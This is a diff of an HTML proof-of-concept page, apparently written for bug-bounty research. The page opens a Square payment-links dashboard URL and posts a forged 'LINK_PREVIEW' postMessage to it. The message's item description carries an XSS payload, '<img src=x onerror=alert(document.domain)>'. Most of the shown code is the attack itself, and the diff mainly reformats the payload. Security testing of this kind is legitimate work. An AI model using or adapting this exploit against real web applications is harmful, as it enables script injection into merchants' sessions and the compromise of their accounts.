@@ -6,48 +6,57 @@
 <body>
   <script>
     const targetUrl = 'https://app.squareup.com/dashboard/payment-links/new'; // 🔥 Replace this
-    const payload = {
-      name: 'LINK_PREVIEW',
-      data: {
-        type: 'INITIALIZE',
-        uuid: 'poc-' + Date.now(),
-        data: {
-          checkout_link: {
-            id: 'link-1',
-            link_type: 'ITEM_LINK',
-            checkout_link_data: {
-              name: 'Product',
-              link_type: 'ITEM_LINK',
-              order_details: {
-                line_items: [
-                  { item_id: 'item-1', quantity: { quantity: 1 } }
-                ]
-              }
-            }
-          },
-          related_objects: [{
-            type: 'ITEM',
-            id: 'item-1',
-            item_data: {
-              name: 'Product',
-              description_html: '',
-              description: '<img src=x onerror=alert(document.domain)>',
-              variations: [{
-                type: 'ITEM_VARIATION',
-                id: 'var-1',
-                item_variation_data: {
-                  item_id: 'item-1',
-                  name: 'Default',
-                  pricing_type: 'FIXED_PRICING',
-                  price_money: { amount: 1000, currency: 'USD' }
-                }
-              }]
-            }
-          }],
-          settings: { checkout_title: 'Test Store' }
-        }
-      }
-    };
+    	const payload = {
+		name: 'LINK_PREVIEW',
+		data: {
+			type: 'INITIALIZE',
+			uuid: 'poc-' + Date.now(),
+			data: {
+				checkout_link: {
+					id: 'link-1',
+					link_type: 'ITEM_LINK',
+					checkout_link_data: {
+						name: 'Product',
+						link_type: 'ITEM_LINK',
+						order_details: {
+							line_items: [{
+								item_id: 'item-1',
+								quantity: {
+									quantity: 1
+								}
+							}]
+						}
+					}
+				},
+				related_objects: [{
+					type: 'ITEM',
+					id: 'item-1',
+					item_data: {
+						name: 'Product',
+						description_html: '',
+						description: '<img src=x onerror="alert(document.domain)">',
+						variations: [{
+							type: 'ITEM_VARIATION',
+							id: 'var-1',
+							item_variation_data: {
+								item_id: 'item-1',
+								name: 'Default',
+								pricing_type: 'FIXED_PRICING',
+								price_money: {
+									amount: 1000,
+									currency: 'USD'
+								}
+							}
+						}]
+					}
+				}],
+				settings: {
+					checkout_title: 'Test Store'
+				}
+			}
+		}
+	};
+
 
     function sendPayload(targetWindow, origin = '*') {
       targetWindow.postMessage(payload, origin);
@@ -77,6 +86,7 @@
         }
       }, 3000);
     }
+
 
     function tryWindowOpen() {
       const win = window.open(targetUrl, '_blank');
